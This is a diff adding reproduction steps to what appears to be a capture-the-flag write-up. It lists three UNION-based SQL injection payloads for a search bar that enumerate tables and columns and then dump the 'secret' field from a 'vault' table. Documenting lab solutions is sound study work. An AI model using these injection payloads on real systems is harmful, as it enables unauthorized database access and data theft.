@@ -213,3 +213,25 @@ The output of that was
   ```
 
   - The flag was found
+
+## Reproduce
+
+- Go to search bar and put there
+
+```
+' UNION SELECT "teste", TABLE_NAME, 1, TABLE_SCHEMA FROM information_schema.tables -- //
+```
+
+- From there get the name of the vault table (should be vault)
+
+- Then put on the bar this to get the collumns of the vault table
+
+```
+  ' UNION SELECT "teste", COLUMN_NAME, 1, "1" FROM information_schema.COLUMNS WHERE TABLE_NAME='vault' -- //
+```
+
+- Then to get the secret put this:
+
+```
+  ' UNION SELECT "teste", item, 1, secret FROM vault -- //
+```
